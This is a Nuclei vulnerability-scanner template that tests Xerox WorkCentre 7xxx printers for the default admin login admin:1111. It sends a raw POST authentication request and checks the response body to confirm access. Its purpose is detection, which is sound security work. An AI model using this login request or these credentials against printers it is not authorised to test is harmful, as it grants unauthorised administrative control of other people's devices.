id: xerox7-default-login
info:
  name: Xerox WorkCentre 7xxx Printer Default Login
  author: MiroslavSotak
  severity: high
  description: Xerox WorkCentre 7xxx printer. default admin credentials admin:1111 were discovered.
  reference:
    - https://www.support.xerox.com/en-us/article/en/x_wc7556_en-O23530
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    # auto-generated by nuclei-sync — unrunnable (forbidden tag: intrusive)
    runzero-review: 'REJECT/2026-08-19/auto: forbidden tag: intrusive'
    max-request: 1
  tags: default-login,intrusive,vuln,xerox
http:
  - attack: pitchfork
    matchers:
      - status:
          - 200
        type: status
      - condition: and
        part: body
        type: word
        words:
          - window.opener.top.location.pathname
          - Xerox Corporation
      - condition: or
        negative: true
        # digest: 4a0a0047304502200f072067f69b3b0cec52c18dd07612b320dde3b61faa1ee9c6107a0c1d50ebf3022100dcecdfa5fa0cac4e477877e3d1f15fe7d127eb4235087e227dd2d543800d94b3:922c64590222798bb761d5b6d8e72950

        part: body
        type: word
        words:
          - invalid
          - errmsg
    matchers-condition: and
    payloads:
      password:
        - 1111
      username:
        - admin
    raw:
      - |
        POST /userpost/xerox.set HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2FluidLogin.php&webUsername={{username}}&webPassword={{password}}&frmaltDomain=default
